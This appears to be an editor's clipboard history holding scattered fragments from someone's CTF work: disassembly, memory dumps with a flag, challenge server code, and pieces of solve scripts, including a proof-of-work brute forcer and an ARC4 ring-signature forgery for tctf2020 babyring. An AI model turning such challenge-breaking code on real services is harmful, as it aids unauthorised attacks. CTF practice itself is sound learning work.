	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	0x0000000000000000
	x/700gx
53767f1ddf35533c722324fc4666529a|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|11|5|V|python
	    print(rax)
821452e121312bfc2824a1979604b3b8|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|9|14|V|python
	    count += 1
	    print(count)
08f5a9a0caa0b92a811379169aee40e0|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|14|1|V|python
	    print("Rax", str(rax))
f7cde01166be310cd3cb328b61624415|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|5|1|V|python
	print(len(data))
066d6fe1bf01eba21856cd91c25c7efb|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|12|1|V|python
	    print("Rsi", str(hex(rsi)))
e79f828e07a1827ff65388eec93898e6|file:///home/neo/CTFs/redpwn2020/r1sc/code.asm|52|1|V|asm
	    1085:	48 8b 44 f5 00       	mov    rax,QWORD PTR [rbp+rsi*8+0x0]
	    108a:	48 8b 44 c5 00       	mov    rax,QWORD PTR [rbp+rax*8+0x0]
	    108f:	48 8b 5c f5 08       	mov    rbx,QWORD PTR [rbp+rsi*8+0x8]
	    1094:	48 29 44 dd 00       	sub    QWORD PTR [rbp+rbx*8+0x0],rax
	    1099:	77 18                	ja     0x10b3
	    109b:	48 83 7c f5 10 02    	cmp    QWORD PTR [rbp+rsi*8+0x10],0x2
	    10a1:	74 0f                	je     0x10b2
	    10a3:	48 83 7c f5 10 00    	cmp    QWORD PTR [rbp+rsi*8+0x10],0x0
	    10a9:	74 08                	je     0x10b3
	    10ab:	48 8b 74 f5 10       	mov    rsi,QWORD PTR [rbp+rsi*8+0x10]
	    10b0:	eb cc                	jmp    0x107e
7b01893903fc0f727814f93db21bc800|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|30|1|V|python
	        rsi = str(num(rsi) + 3)
c846c8dafd216ee14a6b938dc008088b|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|34|9|V|python
	        rsi += 3
12ae9cdc0dd8336769d907c99bc271c8|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|12|5|V|python
	    # print("Rsi", str(hex(rsi)))
76574dc2633002b1ce2f3026df35899b|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|25|1|V|python
	        rsi = str(hex(num(rsi) + 3))
d81c69223ac23c38d922918cde412d75|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|17|1|V|python
	    if rsi >= 3 and rsi <= 8:
	        print("Input buffer:", data[rsi])
9d019369ce9ff217d60e9bd52f4e2ec1|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|21|1|V|python
	    if rax >= 3 and rax <= 8:
a7a4fb335a6d440c7272b26c08f624e9|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|21|1|V|python
	    if rax >= 3 and rax <= 8:
	        print("Input buffer:", data[rax])
636d6b63b6383a700854059c2db8ddb0|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|22|1|V|python
	        print("Input buffer:", data[rax])
97f1728b30e0b3cf92f45f64e81b77be|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|25|1|V|python
	    if rsi+1 >= 3 and rsi+1 <= 8:
	        print("Input buffer:", data[rsi+1])
40f8d01ddc504d5c5462961fb2a52e00|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|4|1|V|
	0x6161616161616161
2b85455f8674ca1e2274715d9a9bd925|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|5|1|V|
	0x000000000a296174
a1c6ca36d45debed819aff48c7244e1e|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|8|19|V|python
	for i in range(3, 9, 1):
	    print(data[i])
b368677bdeb023954f592026bc169035|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|18|1|V|python
	        print(count)
8f75ecd57c789c524b56cc56092c22b7|untitled:1|1|1|V|
	022e01e7f4f4ff
da507095318a6b536ad3be33722403e0|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|5|1|v|
	0x555555557058: 
9c6f7e566112c70405131fa5649414c8|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|6|1|v|
	0x555555557068: 
4760dc46f6b143b9c97ea0e1dc86cf4d|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|7|1|v|
	0x555555557078: 
2db16822b3f8c7ddb0edd37741e3eb3a|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|8|1|V|
	0x6161617b67616c66
	0x6161616161616161
	0x6161616161616161
	0x6161616161616161
	0x6161616161616161
	0x7b61616161616161
51ea12f258033d2b0d0ccc2df7ec3250|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|16|11|v|python
	abs(
6c178f287145ec6bd76a5a1806eb9011|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|32|17|v|python
	abs(data[rbx] - rax)
725514f25f5f3fa0ff7a0c6c9dd07c1c|file:///home/neo/CTFs/redpwn2020/r1sc/solve.py|32|17|v|python
	abs(data[rbx] -
768472c5df702e75b51a5f7b602708a3|file:///home/neo/CTFs/redpwn2020/r1sc/ebp_data|5|1|V|
	0x7463617b67616c66
	0x5f335f796c6c6175 
	0x7463757274736e69
	0x75735f3a736e6f69
	0x65725f2c71656c62
	0x7d33746e695f2c74
198ab56867c14a86e5ac775b3678ad20|file:///home/neo/CTFs/redpwn2020/ratification/server.py|28|1|V|python
			msg = bytes_to_long(input('Message: ').encode())
b9fc01821969f50ea453df01d22e0680|file:///home/neo/CTFs/redpwn2020/ratification/server.py|33|1|V|python
			n1 = [randint(0,11) for _ in range(29)]
			n2 = [randint(0,2**(max(p.bit_length(),q.bit_length())-11)-1) for _ in range(29)]
			a = sum(n1[i]*n2[i] for i in range(29))
	
			enc = [pow(msg,i,n) for i in n2]
			P = np.prod(list(map(lambda x,y: pow(x,y,p),enc,n1)))
			Q = np.prod(list(map(lambda x,y: pow(x,y,q),enc,n1)))
6fdf8318dceb66269eaa71c6a756ad12|file:///home/neo/CTFs/redpwn2020/ratification/server.py|34|9|v|python
	randint(0,2**(max(p.bit_length(),q.bit_length())-11)-1)
ed82059b5254fd1f7f3c7a73cbbe5d40|file:///home/neo/CTFs/redpwn2020/ratification/server.py|41|1|V|python
			b = inverse(e,(p-1)*(q-1))-a
			sig1 = b%(p-1)+randint(0,q-2)*(p-1)
			sig2 = b%(q-1)+randint(0,p-2)*(q-1)
5aed1d5b8c205e01bcc41d646593c2da|file:///home/neo/CTFs/redpwn2020/ratification/server.py|41|7|v|python
	inverse(e,(p-1)*(q-1))-a
4bb781574a36ce52ee27b2a7d10f498d|file:///home/neo/CTFs/redpwn2020/ratification/server.py|42|1|V|python
			sig1 = b%(p-1)+randint(0,q-2)*(p-1)
ab290a8c1bf69914cbcedf048b1b6a7e|file:///home/neo/CTFs/redpwn2020/ratification/server.py|46|1|V|python
			sp = pow(msg,sig1,n)*P%p
4709d8fcc6ab676b559db28a764cb91e|file:///home/neo/CTFs/redpwn2020/ratification/server.py|33|1|V|python
			n1 = [randint(0,11) for _ in range(29)]
			n2 = [randint(0,2**(max(p.bit_length(),q.bit_length())-11)-1) for _ in range(29)]
			a = sum(n1[i]*n2[i] for i in range(29))
	
			enc = [pow(msg,i,n) for i in n2]
			P = np.prod(list(map(lambda x,y: pow(x,y,p),enc,n1)))
			Q = np.prod(list(map(lambda x,y: pow(x,y,q),enc,n1)))
			
			b = inverse(e,(p-1)*(q-1))-a
			sig1 = b%(p-1)+randint(0,q-2)*(p-1)
			sig2 = b%(q-1)+randint(0,p-2)*(q-1)
			print(sig1,sig2)
			
			sp = pow(msg,sig1,n)*P%p
			sq = pow(msg,sig2,n)*Q%q
			s = (q*inverse(q,p)*sp + p*inverse(p,q)*sq) % n
	
baa14d7dd4b9276b9f0af70807a9f15c|file:///home/neo/CTFs/redpwn2020/ratification/server.py|48|8|v|python
	q*inverse(q,p)*sp
86b159c3f5629e447fe946a6dbe28ccd|file:///home/neo/CTFs/redpwn2020/ratification/solve.py|1|9|v|python
	tools 
ceeab7bbadc62030a9e5ffa08c908828|file:///home/neo/CTFs/redpwn2020/ratification/solve.py|19|1|V|python
	log.info("Sig1:", sig1)
f5c2e436ce26cfd17acb5e97762e56a5|file:///home/neo/CTFs/redpwn2020/ratification/solve.py|15|1|V|python
	sigs = r.recvline().strip()
da22df649e1ba78cb19206fd19c63d51|file:///home/neo/CTFs/redpwn2020/ratification/solve.py|15|12|v|python
	sigs
42187b2be44d5ea1303eb4615425d28f|file:///home/neo/CTFs/redpwn2020/ratification/solve.py|15|24|v|python
	.strip(
e4e1e2267adaf3206b86104b488d3799|file:///home/neo/CTFs/redpwn2020/ratification/solve.py|16|7|v|python
	 r.recvline().decode()
943b4b4943b77f5ac7dd6dea9a9c558a|file:///home/neo/CTFs/redpwn2020/ratification/server.py|13|1|V|python
	message = bytes_to_long(b'redpwnCTF is a cybersecurity competition hosted by the redpwn CTF team.')
96bcc0ee1ec19f3eaffe50b96e0ef838|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|26|18|v|python
	prefix_xors
dd3cbc99723cd8f545072dcade8f18ac|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|28|5|V|python
	        if l > 0
5c398a6968507454ba18432a85a83f63|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|29|5|V|python
	    )
25b943103ea4bbe85194a0d1661f2f0e|file:///home/neo/CTFs/redpwn2020/expohash/solve.py|7|1|v|python
	sym_ints
7cdc733b4bdc91e77cddd4070a65efcd|file:///home/neo/ccsc/djinn/solve.py|13|1|V|python
	def check(p):
	    if sha256(p).hexdigest()[-6:] == target:
	        return p
	    return None
c8d4558a78bbc14558db380ecb9f76c0|file:///home/neo/ccsc/djinn/solve.py|30|1|V|python
	    menu = r.recvuntil('Provide bytes X as a hex string such that sha256(X)[-6:] = ', drop=True)
	    if show:
	        print(menu)
	    target = r.recvline().strip()
	    resHash = ''
	    possible = string.ascii_letters+string.digits
	    possible = it.imap(''.join, it.product(possible, repeat=4))
	    pool = mp.Pool(32)
	    log.info('Target: %s' % (target))
	    for c in pool.imap_unordered(check, possible, chunksize=100000):
	        if c:
	            resHash = toHex(c)
	            log.info('Solved - %s' % (resHash))
	            r.sendline(resHash)
	            break
	    pool.close()
b871351aaeebe24d0acf0ca408d7d15a|file:///home/neo/CTFs/tctf2020/babyring/solve.py|15|1|V|python
	log.info(target)
35e7beb32ee7326edc2b3d585b82bc5e|file:///home/neo/CTFs/tctf2020/babyring/solve.py|13|1|V|python
	log.info(suffix)
5f31103fadb237cd8110ad9ab4fe8765|file:///home/neo/ccsc/djinn/solve.py|3|1|V|python
	import itertools as it
	import string
	from hashlib import sha256
	import multiprocessing as mp
212ac72ec48f956f25b5e0ea77caafff|file:///home/neo/CTFs/tctf2020/babyring/solve.py|24|1|V|python
	log.info('Target: %s' % (target))
716de874a0d74f25c0aa8c444c3a7539|file:///home/neo/CTFs/tctf2020/babyring/solve.py|17|11|v|python
	Prefix
871ce7c7fc486047ee382baa2b71272d|file:///home/neo/CTFs/tctf2020/babyring/solve.py|29|9|V|python
	        resHash = toHex(c)
3daa2e8b904d651a5c333f46f8df48bb|file:///home/neo/CTFs/tctf2020/babyring/task.py|6|1|V|python
	from Crypto.Cipher import ARC4
cbb153fc3f5f5e129ad3a86f40309585|file:///home/neo/CTFs/tctf2020/babyring/solve.py|37|15|v|python
	all()
6709a65e15f10e0c005e2630633a6eb2|file:///home/neo/CTFs/tctf2020/babyring/solve.py|13|9|V|python
	        print(sha256(p+suffix).hexdigest())
cee198952242f81f766a63b4f95effde|file:///home/neo/CTFs/tctf2020/babyring/solve.py|11|5|V|python
	    p = d
4ec1b477cd0232b832c1899905ec51a4|file:///home/neo/CTFs/tctf2020/babyring/solve.py|12|17|v|python
	suffix
4ffe1098753bfacf00f3d864d2d8ed2c|file:///home/neo/CTFs/tctf2020/babyring/solve.py|37|2|V|python
	lines = r.recvline()
	print(lines)
3612900aca65efb7f06493e1bb85fdf2|file:///home/neo/CTFs/tctf2020/babyring/solve.py|34|23|V|python
	        lines = r.recv()
	        print(lines)
51aafd850f57c1a75c9eac514ed301f8|file:///home/neo/CTFs/tctf2020/babyring/task.py|12|1|V|python
	def gen():
	    from Crypto.Util.number import getStrongPrime
	    e = 65537
	    Ns = []
	    for i in range(K):
	        p = getStrongPrime(2048)
	        q = getStrongPrime(2048)
	        Ns.append(p*q)
	    return e,Ns
	
ecbf83ccae16ceaf2702b32af3e3f4c4|file:///home/neo/CTFs/tctf2020/babyring/task.py|2|1|V|python
	import os,random,sys,string
	from hashlib import sha256
	from struct import pack, unpack
	import SocketServer
	from Crypto.Cipher import ARC4
4177972306fa4ac312dc71600b9ec17b|file:///home/neo/CTFs/tctf2020/babyring/task.py|42|1|V|python
	            key = sha256(msg).digest()[:16]
	            E = ARC4.new(key)
4a2483ebb6cf6d4e8bb53b28ea2d6362|file:///home/neo/CTFs/tctf2020/babyring/task.py|5|1|V|python
	import SocketServer
7053ca318dacfc968af7426fd79f25f8|file:///home/neo/CTFs/tctf2020/babyring/task.py|2|1|V|python
	import os,random,sys,string
	from hashlib import sha256
	from struct import pack, unpack
	from Crypto.Cipher import ARC4
8b1e772d79eff2ef5c9d1386c5ebcb05|file:///home/neo/CTFs/tctf2020/babyring/solve.py|28|1|V|python
	resHash = ''
60fb3fd723cb7b1cd245714591584ed4|file:///home/neo/CTFs/tctf2020/babyring/task.py|46|1|V|python
	                pt = (ys[i]^cur)%(1<<64)
	                ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	                cur = ct
2fc5cc71dc51a52a81d17a4b17ea2d6e|file:///home/neo/CTFs/tctf2020/babyring/task.py|12|77886|v|python
	904806466130350095823237738235466565149116419740115167615252013429472870718453764334928944989974446264893106587283630380182954993862849950489048986066518895370097604215302292332563539757730856505933359247694335310149251519953664617696895694544085573697022732642590826174310187509331268045480294214434981811362716592092993321707192515812121686510290284582366955860544463731925202227311840278420403876107230233437388785821614716401137069654378913884512185526583835507621984455888670122061931153812101571563153522648443415193602390689397249596266332328353726173451118451175190049657108642912589626791964966721217115551048530686626712103861216604207316071929631898944954780490042511015644951502302614054658699036923639288644960410888998029401057429550397929941543644918267221440356215667397022577333794906282558876950898529353354297283076823480396034993972577166002646416605909232435919989511978628610231785190235296819294579045526577630720099104975244440561011411050236266533715307102642502010171914671647448296205723806421062781563889905030132932204525452606542275562200281824146465108263417565448858217721520951606206451739464993784659860260224920895480582558529039545949143318246424863871726730127295811753472568791306856475788466227L
71448b10817a9539b80fd3b1523ea2ff|file:///home/neo/CTFs/tctf2020/babyring/solve.py|8|18|v|python
	770490466907683602110378071421369221862921320503590614209797163508400496321974699751838925910212582067640033338208253848185705000931772110272228438746303216456214840281999977271664884049737412489683336247146905970790657719110482280684265791321005072325768791089586227842965307689398081448494378605026677164880175617681310072923299030259218276844723163201010992461606002634098913814203454235138549874354352794501374973634628738845273607238282863229873145869264050655662663079247102827774495142451851523340665219493474500446630311650947391863060353578845519230453003253319043010396105487377221402499331935031452578682212804231558194990663195372223764943882094463713596011601657519999628272423455022371050823050808824658199918369321615075229948272656495349149432117067836490889547265127126795646868049067849776438415984256095396376586400344784872140819756271139898769893788303870788292068857936681358238629576670680615413707360812345103022413565834670031956214258628401267394717093065558297210543991364219326902442594221010678553053229221766996388105122917592614388933032203219308304446696277824948231236918841049974834775435864666332248390351274331259641759161745003665310088775244490548767780498840500389907455677369729620283990291401L
72220a8df31eb8fd1a85fc0f34b1664d|file:///home/neo/CTFs/tctf2020/babyring/solve.py|40|14|v|python
	'x1: '
83d522f82d7026fc10b90842d1d6e745|file:///home/neo/CTFs/tctf2020/babyring/solve.py|40|1|V|python
	print(r.recv())
3b16871eec66ddc399c7195877495c0c|file:///home/neo/CTFs/tctf2020/babyring/task.py|42|1|V|python
	            key = sha256(msg).digest()[:16]
	            E = ARC4.new(key)
	            cur = v
	            for i in range(K):
	                pt = (ys[i]^cur)%(1<<64)
	                ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	                cur = ct
a8f39442f32d9b43d37e4146915ff64d|file:///home/neo/CTFs/tctf2020/babyring/task.py|47|22|v|python
	unpack('Q', E.encrypt(pack('Q',pt)))[0]
5687f8ac42f075d27e6778ba5f1a3af2|file:///home/neo/CTFs/tctf2020/babyring/task.py|43|1|V|python
	            E = ARC4.new(key)
05246c4683e8f0c222e81c70cce91f25|file:///home/neo/CTFs/tctf2020/babyring/solve.py|4|1|V|python
	from hashlib import sha256
	import multiprocessing as mp
	from Crypto.Cipher import ARC4
5e20e488d2e04469bea97171d1031878|file:///home/neo/CTFs/tctf2020/babyring/task.py|55|1|V|python
	            for i in range(K):
988059450f9b2b3b7dfcefeb551603dc|file:///home/neo/CTFs/tctf2020/babyring/task.py|57|1|V|python
	                ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
8b07cac7cb4223b2a2140a32225a7265|file:///home/neo/CTFs/tctf2020/babyring/solve.py|25|1|V|python
	for i in range(K):
	    keystream.append(unpack('Q', E.encrypt(pack('Q',0)))[0])
004ac14284d35ff99420867358f363a7|file:///home/neo/CTFs/tctf2020/babyring/solve.py|1|1|V|python
	from pwn import *
	import itertools as it
0a4ba1889dd866d5e18a33f3a2d63ce5|file:///home/neo/CTFs/tctf2020/babyring/task.py|2|1|V|python
	import os,random,sys,string
	from hashlib import sha256
	from struct import pack, unpack
5780ef965492ed179253f9496a2a36f3|file:///home/neo/CTFs/tctf2020/babyring/task.py|4|1|V|python
	from struct import pack, unpack
afca71ee11093773dc8cd9e3a2a37956|file:///home/neo/CTFs/tctf2020/babyring/task.py|53|1|V|python
	            E = ARC4.new(key)
	            cur = v
	            for i in range(K):
	                pt = (ys[i]^cur)%(1<<64)
	                ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	                cur = ct
7523ed3a4d753c0c4999dc8d4fa28cba|file:///home/neo/CTFs/tctf2020/babyring/solve.py|30|1|V|python
	target_pt = keystream[-1] ^ 1
e575822a4f4ee6a133f4de8100700cb7|file:///home/neo/CTFs/tctf2020/babyring/solve.py|30|1|^v|python
	    ...:             c
3931f6ab1f17c9a0ef94f7f5b89b296f|file:///home/neo/CTFs/tctf2020/babyring/solve.py|31|1|v|python
	    ...:             
b82cc93283c487fc5a7f8725c37ba39d|file:///home/neo/CTFs/tctf2020/babyring/solve.py|34|1|v|python
	    ...:                 
17210a3e324da1c2259375e2b3f0e5c4|file:///home/neo/CTFs/tctf2020/babyring/solve.py|35|1|v|python
	    ...:                 ct = un
d4577fe87f639ad045a01f62d4c7381f|file:///home/neo/CTFs/tctf2020/babyring/solve.py|43|1|V|python
	v = 1
061a21adf2c453979023f22af49683f9|file:///home/neo/CTFs/tctf2020/babyring/solve.py|9|1|V|python
	e, N = 65537, 904806466130350095823237738235466565149116419740115167615252013429472870718453764334928944989974446264893106587283630380182954993862849950489048986066518895370097604215302292332563539757730856505933359247694335310149251519953664617696895694544085573697022732642590826174310187509331268045480294214434981811362716592092993321707192515812121686510290284582366955860544463731925202227311840278420403876107230233437388785821614716401137069654378913884512185526583835507621984455888670122061931153812101571563153522648443415193602390689397249596266332328353726173451118451175190049657108642912589626791964966721217115551048530686626712103861216604207316071929631898944954780490042511015644951502302614054658699036923639288644960410888998029401057429550397929941543644918267221440356215667397022577333794906282558876950898529353354297283076823480396034993972577166002646416605909232435919989511978628610231785190235296819294579045526577630720099104975244440561011411050236266533715307102642502010171914671647448296205723806421062781563889905030132932204525452606542275562200281824146465108263417565448858217721520951606206451739464993784659860260224920895480582558529039545949143318246424863871726730127295811753472568791306856475788466227
042dc3db0f2d80ab8d707325ff1c81f2|file:///home/neo/CTFs/tctf2020/babyring/task.py|22|67998|v|python
	675300635077398138879969930325504702692515028214932316208876906943214810465111348680663699108184325603896912257957179528056843749850137535447859887486752941692425808224859267878771036579254289238367055571599832872980355929719485345116162663786746616370756028824674919853081405599278629504374298094734239173052232826710949228319865483029300404078143507037206399202663982588539554348635836949067503824743491436160619478144909968074446884078663954014350865562560100019004360133150839934863851927746243768282545247371443435361268162473075837278452337428536888728469687962405368319644075618468777515682060423693626188277244606930384695950198855321653268193169647570748507747870540241042729823099136308673866629240425564466398808363743647835242085777282506774099382996306098665476742223707709594891025035683470560530171246043868991592627523971717730689410027612145043942568031239345961357430712981342953224587076532653403861743009297368524357195259303062239976808962238863043486447977198378138002904134152344826999873346076202067409644604084728833655786519999793984405832203516226027009069106816771355675907252773607276976397683106750041569342111082660025685786225158039115156685579871614115581529768289319585462897678895896799918734194207L
d95af00608ad8a3c97d84f998ecaf26a|file:///home/neo/CTFs/tctf2020/babyring/solve.py|9|15|v|python
	
27f6571c77e0731254fe69fe537967c4|file:///home/neo/CTFs/tctf2020/babyring/solve.py|1|1|V|python
	from pwn import *
	from struct import pack, unpack
	import itertools as it
	import string
	from hashlib import sha256
	import multiprocessing as mp
	from Crypto.Cipher import ARC4
c1213e25d79801c164269841ec0439de|file:///home/neo/CTFs/tctf2020/babyring/solve.py|11|1|V|python
	def check(p):
	    global suffix
	    global target
	    tohash = bytes(p+suffix, 'utf-8')
	    if sha256(tohash).hexdigest() == target:
	        return p
	    return None
26689a4bf698bde314f1932a38ad710e|file:///home/neo/CTFs/tctf2020/babyring/find.py|10|3|V|python
	    global suffix
	    global target
84293da7eb5d9d719cccbdc2e4062782|file:///home/neo/CTFs/tctf2020/babyring/find.py|10|5|V|python
	    tohash = bytes(p+suffix, 'utf-8')
37a43f723b92b5726c4f478d245d75ed|file:///home/neo/CTFs/tctf2020/babyring/solve.py|58|1|V|python
	possible = string.ascii_letters+string.digits
	possible = list(map(''.join, it.product(possible, repeat=4)))
	pool = mp.Pool(32)
	for c in pool.imap_unordered(check, possible, chunksize=100000):
	    if c:
	        log.info('Solved - %s' % (c))
	        r.sendline(c)
	        break
	pool.close()
948aa8c6d61cb8a739377f4345df6453|file:///home/neo/CTFs/tctf2020/babyring/find.py|16|1|V|python
	possible = string.ascii_letters+string.digits
a17ab1216993e72a8665000539bcb562|file:///home/neo/CTFs/tctf2020/babyring/find.py|16|12|v|python
	list(map(''.join, it.product(possible, repeat=4)))
4a7a1096cbac0757d4c8fac4ba4c5d62|file:///home/neo/CTFs/tctf2020/babyring/find.py|1|1|V|python
	from pwn import *
2c8fd465c4e24e2ae663cdc0e4aae8ba|file:///home/neo/CTFs/tctf2020/babyring/find.py|2|1|V|python
	from hashlib import sha256
3f4981a9017233343de0b384e845076d|file:///home/neo/CTFs/tctf2020/babyring/find.py|17|1|V|python
	        r.sendline(c)
19ca1e6c29001f073ebaa4aaecf9259f|file:///home/neo/CTFs/tctf2020/babyring/solve.py|20|1|V|python
	K = 64
	
	msg = b'hello'
	keystream = []
	key = sha256(msg).digest()[:16]
	E = ARC4.new(key)
	
	for i in range(K):
	    keystream.append(unpack('Q', E.encrypt(pack('Q',0)))[0])
	
	ys = []
	for i in range(K-1):
	    ys.append(1)
	
	E = ARC4.new(key)
	v = 1
	cur = v
	curs =[]
	curs.append(v)
	for i in range(K-1):
	    pt = (ys[i]^cur)%(1<<64)
	    ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	    cur = ct
	    curs.append(cur)
	
	target_pt = keystream[-1] ^ 1
	ys.append(target_pt ^ curs[-1])
	last_y = ys[-1]
	print(last_y)
526b6e7ad21abbd16f45890718017284|file:///home/neo/CTFs/tctf2020/babyring/solve.py|20|1|V|python
	K = 64
	
	msg = b'hello'
	keystream = []
	key = sha256(msg).digest()[:16]
	E = ARC4.new(key)
	
	for i in range(K):
	    keystream.append(unpack('Q', E.encrypt(pack('Q',0)))[0])
	
	ys = []
	for i in range(K-1):
	    ys.append(1)
	
	E = ARC4.new(key)
	v = 1
	cur = v
	curs =[]
	curs.append(v)
	for i in range(K-1):
	    pt = (ys[i]^cur)%(1<<64)
	    ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	    cur = ct
	    curs.append(cur)
	
	target_pt = keystream[-1] ^ 1
	ys.append(target_pt ^ curs[-1])
	last_y = ys[-1]
	print(last_y)
	
3e46751aaad6ee39b306b98a40d6aeb4|file:///home/neo/CTFs/tctf2020/babyring/task.py|52|1|V|python
	            key = sha256(msg).digest()[:16]
	            E = ARC4.new(key)
	            cur = v
	            for i in range(K):
	                pt = (ys[i]^cur)%(1<<64)
	                ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	                cur = ct
	                
	            if cur == v:
13880b5e5b6dbe2e45277db464337a32|file:///home/neo/CTFs/tctf2020/babyring/solve.py|30|1|V|python
	ys = []
	for i in range(K-1):
	    ys.append(0)
	
	E = ARC4.new(key)
	v = 1
	cur = v
	curs =[]
	curs.append(v)
	for i in range(K-1):
	    pt = (ys[i]^cur)%(1<<64)
	    ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	    cur = ct
	    curs.append(cur)
	
	target_pt = keystream[-1]
	ys.append(target_pt ^ curs[-1])
	last_y = ys[-1]
	print(last_y)
36f4ddc11de1078b681ed7160c2198e2|file:///home/neo/CTFs/tctf2020/babyring/solve.py|20|1|V|python
	K = 64
	
	msg = b'hello'
	keystream = []
	key = sha256(msg).digest()[:16]
	E = ARC4.new(key)
	
	for i in range(K):
	    keystream.append(unpack('Q', E.encrypt(pack('Q',0)))[0])
	
	ys = []
	for i in range(K-1):
	    ys.append(0)
	
	E = ARC4.new(key)
	v = 1
	cur = v
	curs =[]
	curs.append(v)
	for i in range(K-1):
	    pt = (ys[i]^cur)%(1<<64)
	    ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	    cur = ct
	    curs.append(cur)
	
	target_pt = keystream[-1]
	ys.append(target_pt ^ curs[-1])
	last_y = ys[-1]
	print(last_y)
eada9ddbec7ba636a1ed5f3ea6f80b83|file:///home/neo/CTFs/tctf2020/babyring/task.py|52|1|V|python
	            key = sha256(msg).digest()[:16]
	            E = ARC4.new(key)
	            cur = v
	            for i in range(K):
	                pt = (ys[i]^cur)%(1<<64)
	                ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	                cur = ct
	                
	            if cur == v:
	                self.request.sendall("%s\n" % flag)
8d9d547a4878275448991e00a4c5d3f0|file:///home/neo/CTFs/tctf2020/babyring/solve.py|20|1|V|python
	K = 64
	
	msg = b'hello'
	keystream = []
	key = sha256(msg).digest()[:16]
	E = ARC4.new(key)
	
	for i in range(K):
	    keystream.append(unpack('Q', E.encrypt(pack('Q',0)))[0])
	
	ys = []
	for i in range(K-1):
	    ys.append(0)
	
	E = ARC4.new(key)
	v = 0
	cur = v
	curs =[]
	curs.append(v)
	for i in range(K-1):
	    pt = (ys[i]^cur)%(1<<64)
	    ct = unpack('Q', E.encrypt(pack('Q',pt)))[0]
	    cur = ct
	    curs.append(cur)
	
	target_pt = keystream[-1]
	ys.append(target_pt ^ curs[-1])
	last_y = ys[-1]
	print(last_y)
78518faccccac4b2972340850033c765|file:///home/neo/.config/i3/config|179|26|v|conf
	bg-color           $bg-color          $text-color          #00ff00
30c176b5cedbf1a2f803890104b27326|file:///home/neo/.config/i3/config|179|26|v|conf
	bg-color
5138afffa90316b5c090692b476a61e2|file:///home/neo/.config/i3/config|177|1|V|conf
	# window colors
df8b2dbf1db68daa315ab22e04677e6f|file:///home/neo/.config/i3/config|179|86|v|conf
	00ff00
ab4086ecd47c568d5ba5739d4078988f|file:///home/neo/.config/i3/config|247|33|v|conf
	pixel
1672ac06bfcc537266c679f7d7f9f76a|file:///home/neo/.config/i3/config|179|85|v|conf
	#00ff00
bfd9e737d4d350d65624c47933df41ba|file:///home/neo/.config/i3/config|178|93|v|conf
	a83a32 
5eb2927fd0f142ddb056a37e703e1a19|untitled:1|1|1|V|python
	small = '◊ê'
	big = '◊™'
	ct=('◊ò◊ô◊ô◊¶◊¢◊©◊ì◊ï◊û◊ù◊ö◊î◊®◊•◊°◊¢◊ñ◊ê◊©◊ì◊ê6◊™◊û◊ù53◊•6◊¢◊ö7◊ö◊•◊ß◊ñ◊ò◊©◊õ◊¢◊û◊ù◊™◊ñ◊í3◊£◊î◊õ5◊î◊ñ65◊™7◊ò◊ô◊†◊ß◊ñ◊©◊ô◊£◊ñ◊ô◊ü◊§◊í3◊ì◊ó◊ù5◊©◊ñ◊¢5◊ì◊ò◊ù◊•◊ü◊•◊û33◊¢◊ù◊ù◊©◊ß◊™===')
482a3466a86e254774ff1f0ce2a9ffe4|untitled:1|8|15|v|python
	bin(ord(c) - ord(small))[2:].zfill(5)
b242fab8864f0aca79e96bcb5f2adddc|untitled:1|12|15|v|python
	bin(ord(c)-(ord('2')+26))[2:].zfill(5)
4778b215534617112bd99d4c8c0e9362|untitled:1|12|9|V|python
	        print(bin(ord(c)-(ord('2')+26))[2:].zfill(5))
8003179a6c673403744927e1974ffaa8|untitled:1|9|5|V|python
	        print(bin(ord(c) - ord(small))[2:].zfill(5))
0c8c1126828086ddab6060fa9b1c2375|untitled:1|15|9|v|python
	'0b110100001100101011011000110110001101111'
c611136d212f43dd28fdff92dc79f9b5|untitled:1|11|15|v|python
	bin(ord(c)-ord('2')+26)[2:].zfill(5)
2db2f35cb6df3240b96cfacd320776b1|untitled:1|5|36|V|python
	print(bin(ord(big) - ord(small))[2:].zfill(5))
	print(bin(ord('2')-ord('2')+27)[2:].zfill(5))
81fb02110058536f63d267d2c1b8365d|untitled:1|16|8|V|python
	print(pt)
	n = int(pt, 2)
